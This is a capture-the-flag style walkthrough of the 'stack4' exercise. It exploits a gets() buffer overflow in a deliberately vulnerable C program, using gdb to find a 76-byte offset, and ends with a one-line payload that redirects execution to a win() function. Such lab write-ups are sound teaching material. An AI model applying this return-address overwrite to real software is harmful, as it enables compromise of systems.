Let’s take a look at the source code

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Looking at the code, it just establishes a buffer, and uses the gets() function to take input. In addition to that there is a win function, however it is not called anywhere in the function, and in the program it appears that there is no where to call it. However there is still a way to call it.

When the program is running, the return address dictates what code will get executed next. If we can overflow that, and change the value to that of the win function, we should be able to pwn the program. To do so, first we will need to get the address of the win() function.

```
gdb ./stack4
print win
$1 = {void (void)} 0x80483f4 <win>
```

And we have the address of the win function, 0x80483f4. Now we need to find the distance between where we can input data, and the return address. To do this my way first leave gdb, and create a payload that will overflow the stack.

```
python -c ‘print “1”*50’ > /tmp/payload
```

Now that we have the payload, let’s overflow the program in gdb and see what the difference is.

```
gdb ./stack4
```

First we need to set a breakpoint, then run it and feed it the payload

```
disas main
b * main+21
r < /tmp/payload 
```

And now that we have reached the breakpoint, let’s see what the state of the esp register is, which should hold the data inputted via gets()/

```
x/24x $esp
```

And we can see that the input starts at location 0xbffffce0, because that is where the hex values 0x31313131 (equivalent to the ascii value 1111) starts. Now we just need to find the value of the return address. In x86 architecture, the return address is usually stored in the $eip register. We can look at the frame to see that.

```
info frame
```

And on the last two lines, we see

```
Saved registers:
 ebp at 0xbffffd28, eip at 0xbffffd2c
```

Since these are the saved registers, we care about this eip, and from here we can tell that the current address of the eip regeister is 0xbffffd2c. So we can just subtract the address which we can start inputting data from the return address, and that should give us the distance we need to overflow. I did this calculation in python.


0xbffffd2c - 0xbffffce0 = 76


So we have to overflow 76 bytes, then write the address of the win() function (0x80483f4), and then the program should execute the win function. Let’s try it!

```
echo `python -c ‘print “1”*76 + “\xf4\x83\x04\x08”’` | ./stack4
code flow successfully changed 
```

And just like that, we pwned the program.
